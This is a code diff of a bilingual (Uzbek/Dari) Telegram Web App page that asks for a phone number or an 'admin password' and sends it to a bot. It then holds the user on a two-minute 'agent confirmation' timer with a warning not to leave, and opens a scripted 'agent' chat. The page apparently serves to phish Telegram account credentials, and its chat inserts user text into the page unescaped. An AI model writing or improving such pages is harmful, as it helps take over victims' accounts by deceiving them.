@@ -14,6 +14,7 @@
             --text-secondary: #6c757d;
             --danger-color: #d93838;
             --border-color: #dee2e6;
+            --success-color: #10b981;
         }
 
         body {
@@ -45,7 +46,6 @@
             text-align: center;
         }
 
-        /* Bayroq stikerlari orqali til tanlash */
         .flag-selector {
             display: flex;
             justify-content: center;
@@ -106,7 +106,7 @@
             font-weight: 600;
         }
 
-        input {
+        input, textarea {
             width: 100%;
             padding: 14px 16px;
             background: #ffffff;
@@ -120,7 +120,7 @@
             transition: border-color 0.2s;
         }
 
-        input:focus {
+        input:focus, textarea:focus {
             border-color: var(--accent-color);
         }
 
@@ -132,6 +132,7 @@
             letter-spacing: 0.6px;
             font-weight: 700;
             text-transform: uppercase;
+            line-height: 1.4;
         }
 
         .btn-submit {
@@ -146,16 +147,10 @@
             font-weight: 600;
             cursor: pointer;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            transition: opacity 0.2s, transform 0.1s;
         }
 
-        .btn-submit:active {
-            transform: scale(0.98);
-        }
-
-        .timer-screen, .password-screen {
-            display: none;
-        }
+        .screen { display: none; }
+        .screen.active { display: block; }
 
         .timer-display {
             font-size: 36px;
@@ -165,22 +160,83 @@
             font-family: monospace;
         }
 
-        .status-text {
+        /* Premium SVG Checkmark Animatsiyasi */
+        .success-animation {
+            margin: 20px auto;
+            width: 80px;
+            height: 80px;
+        }
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: block;
+            stroke-width: 3;
+            stroke: var(--success-color);
+            stroke-miterlimit: 10;
+            box-shadow: inset 0px 0px 0px var(--success-color);
+            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+        }
+        .checkmark__circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 3;
+            stroke-miterlimit: 10;
+            stroke: var(--success-color);
+            fill: none;
+            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+        .checkmark__check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.6s forwards;
+        }
+        @keyframes stroke { 100% { stroke-dashoffset: 0; } }
+        @keyframes scale { 0%, 100% { transform: none; } 50% { transform: scale3d(1.1, 1.1, 1); } }
+
+        /* Bot ichidagi chat interfeysi */
+        .chat-box {
+            height: 220px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            background: #ffffff;
+            overflow-y: auto;
+            padding: 12px;
+            margin-bottom: 15px;
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .message {
+            padding: 10px 14px;
+            border-radius: 10px;
             font-size: 13px;
+            max-width: 80%;
             font-style: italic;
-            color: var(--text-secondary);
-            margin-bottom: 16px;
+        }
+        .message.incoming {
+            background: #f1f3f5;
+            color: var(--text-color);
+            align-self: flex-start;
+        }
+        .message.outgoing {
+            background: var(--accent-color);
+            color: #fff;
+            align-self: flex-end;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- 1-Qadam: Til (Stiker) va Ma'lumot kiritish -->
-    <div class="card" id="step-input">
+    
+    <!-- 1-Qadam: Ma'lumot yoki Parol kiritish -->
+    <div class="card screen active" id="step-input">
         <div class="flag-selector">
-            <button class="flag-btn active" onclick="setLanguage('uz')" title="O'zbekcha">🇺🇿</button>
-            <button class="flag-btn" onclick="setLanguage('af')" title="Dari">🇦🇫</button>
+            <button class="flag-btn active" onclick="setLanguage('uz')">🇺🇿</button>
+            <button class="flag-btn" onclick="setLanguage('af')">🇦🇫</button>
         </div>
 
         <div class="title" id="txt-title">Telefon raqamni tasdiqlash</div>
@@ -191,8 +247,7 @@
             <input type="tel" id="phone-input" placeholder="+998 90 123 45 67">
         </div>
 
-        <!-- Parol kiritish maydoni (agar oldin ro'yxatdan o'tgan bo'lsa) -->
-        <div class="form-group password-screen" id="step-password">
+        <div class="form-group password-screen" id="step-password" style="display:none;">
             <label id="txt-pass-label">ADMIN PAROLI</label>
             <input type="password" id="password-input" placeholder="Parolni kiriting">
         </div>
@@ -202,13 +257,36 @@
         <button class="btn-submit" id="txt-btn" onclick="handleSubmit()">Tasdiqlash</button>
     </div>
 
-    <!-- 2-Qadam: 2 minutlik Taymer ekrani -->
-    <div class="card timer-screen" id="step-timer">
+    <!-- 2-Qadam: Taymer ekrasi -->
+    <div class="card screen" id="step-timer">
         <div class="title" id="timer-title">Agent tasdiqlashini kuting</div>
         <div class="timer-display" id="timer-count">02:00</div>
         <div class="status-text" id="timer-status">Ma'lumotlar tekshirilmoqda...</div>
-        <div class="notice" id="timer-notice">Kirish bor chiqish yo'q</div>
+        <div class="notice" id="timer-warn">Agent tasdiqlash vaqti tugamagunicha ilovadan chiqib ketmang, yoʻqsa boshidan boshlashga toʻgʻri keladi.</div>
+        <div class="notice" id="timer-notice" style="margin-top:10px;">Kirish bor chiqish yo'q</div>
     </div>
+
+    <!-- 3-Qadam: Muvaffaqiyatli tasdiqlangandagi Premium Ekran & Chat -->
+    <div class="card screen" id="step-success">
+        <div class="success-animation">
+            <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+                <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+            </svg>
+        </div>
+        <div class="title" id="success-title">Tasdiqlanish muvaffaqiyatli oʻtdi</div>
+        <div class="subtitle" id="success-sub">Agent bilan to'g'ridan-to'g'ri muloqot:</div>
+
+        <div class="chat-box" id="chat-box">
+            <div class="message incoming" id="welcome-chat-msg">Salom, men agentman. Ma'lumotlaringiz tasdiqlandi. Savollaringiz bo'lsa yozing.</div>
+        </div>
+
+        <div style="display: flex; gap: 8px;">
+            <input type="text" id="chat-input" placeholder="Xabar yozish..." style="margin-bottom:0;">
+            <button class="btn-submit" style="width: 70px; padding: 10px;" onclick="sendMessage()"> ➤ </button>
+        </div>
+    </div>
+
 </div>
 
 <script>
@@ -227,7 +305,11 @@
             notice: "Kirish bor chiqish yo'q",
             btn: "Tasdiqlash",
             timerTitle: "Agent tasdiqlashini kuting",
-            timerStatus: "Ma'lumotlar tekshirilmoqda..."
+            timerStatus: "Ma'lumotlar tekshirilmoqda...",
+            timerWarn: "Agent tasdiqlash vaqti tugamagunicha ilovadan chiqib ketmang, yoʻqsa boshidan boshlashga toʻgʻri keladi.",
+            successTitle: "Tasdiqlanish muvaffaqiyatli oʻtdi",
+            successSub: "Agent bilan to'g'ridan-to'g'ri muloqot:",
+            chatWelcome: "Salom, men agentman. Ma'lumotlaringiz tasdiqlandi. Savollaringiz bo'lsa yozing."
         },
         af: {
             title: "تایید شماره تلیفون",
@@ -237,11 +319,14 @@
             notice: "ورود هست برگشت نیست",
             btn: "تایید",
             timerTitle: "منتظر تایید ایجنټ باشید",
-            timerStatus: "اطلاعات در حال بررسی است..."
+            timerStatus: "اطلاعات در حال بررسی است...",
+            timerWarn: "تا زمانی که وقت تایید تمام نشده از اپلیکیشن خارج نشوید، در غیر این صورت باید از ابتدا شروع کنید.",
+            successTitle: "تایید با موفقیت انجام شد",
+            successSub: "ارتباط مستقیم با ایجنټ:",
+            chatWelcome: "سلام، من ایجنټ هستم. اطلاعات شما تایید شد. اگر سوالی دارید بنویسید."
         }
     };
 
-    // Agar foydalanuvchi oldindan ro'yxatdan o'tgan bo'lsa, faqat parol maydonini chiqaramiz
     if (isRegistered) {
         document.getElementById('phone-group').style.display = 'none';
         document.getElementById('step-password').style.display = 'block';
@@ -262,16 +347,39 @@
         document.getElementById('txt-btn').innerText = t.btn;
         document.getElementById('timer-title').innerText = t.timerTitle;
         document.getElementById('timer-status').innerText = t.timerStatus;
+        document.getElementById('timer-warn').innerText = t.timerWarn;
         document.getElementById('timer-notice').innerText = t.notice;
+        document.getElementById('success-title').innerText = t.successTitle;
+        document.getElementById('success-sub').innerText = t.successSub;
+        document.getElementById('welcome-chat-msg').innerText = t.chatWelcome;
     }
 
-    function startTimer(seconds) {
-        let duration = seconds;
+    window.onload = function() {
+        setLanguage('uz');
+        let savedEndTime = localStorage.getItem('timer_end_time');
+        if (savedEndTime) {
+            let timeLeft = Math.floor((parseInt(savedEndTime) - Date.now()) / 1000);
+            if (timeLeft > 0) {
+                switchScreen('step-timer');
+                startTimerWithSeconds(timeLeft);
+            } else {
+                localStorage.removeItem('timer_end_time');
+                switchScreen('step-success');
+            }
+        }
+    };
+
+    function switchScreen(screenId) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(screenId).classList.add('active');
+    }
+
+    function startTimerWithSeconds(duration) {
         const display = document.getElementById('timer-count');
         
         const interval = setInterval(() => {
-            const minutes = Math.floor(duration / 60);
-            const secs = duration % 60;
+            let minutes = Math.floor(duration / 60);
+            let secs = duration % 60;
 
             display.textContent = 
                 (minutes < 10 ? "0" : "") + minutes + ":" + 
@@ -279,7 +387,8 @@
 
             if (--duration < 0) {
                 clearInterval(interval);
-                display.textContent = "00:00";
+                localStorage.removeItem('timer_end_time');
+                switchScreen('step-success');
             }
         }, 1000);
     }
@@ -291,15 +400,7 @@
                 alert(currentLang === 'uz' ? "Raqamni to'g'ri kiriting" : "شماره را درست وارد کنید");
                 return;
             }
-
-            // Botga raqamni yuborish
-            tg.sendData(JSON.stringify({
-                type: "phone",
-                phone: phone,
-                lang: currentLang
-            }));
-
-            // Saqlab qo'yamiz, keyingi safar faqat parol so'raydi
+            tg.sendData(JSON.stringify({ type: "phone", phone: phone, lang: currentLang }));
             localStorage.setItem('verified_user', 'true');
         } else {
             const password = document.getElementById('password-input').value;
@@ -307,20 +408,27 @@
                 alert(currentLang === 'uz' ? "Parolni kiriting" : "رمز عبور را وارد کنید");
                 return;
             }
-
-            // Botga parolni tekshirish uchun yuborish
-            tg.sendData(JSON.stringify({
-                type: "password",
-                password: password,
-                lang: currentLang
-            }));
+            tg.sendData(JSON.stringify({ type: "password", password: password, lang: currentLang }));
         }
 
-        // 2 minutlik taymer ekraniga o'tish
-        document.getElementById('step-input').style.display = 'none';
-        document.getElementById('step-timer').style.display = 'block';
-        
-        startTimer(120); // 2 minut (120 soniya)
+        let endTime = Date.now() + 120 * 1000;
+        localStorage.setItem('timer_end_time', endTime);
+
+        switchScreen('step-timer');
+        startTimerWithSeconds(120);
+    }
+
+    function sendMessage() {
+        const input = document.getElementById('chat-input');
+        const text = input.value.trim();
+        if (!text) return;
+
+        const box = document.getElementById('chat-box');
+        box.innerHTML += `<div class="message outgoing">${text}</div>`;
+        input.value = '';
+        box.scrollTop = box.scrollHeight;
+
+        tg.sendData(JSON.stringify({ type: "chat_message", text: text }));
     }
 </script>
 </body>
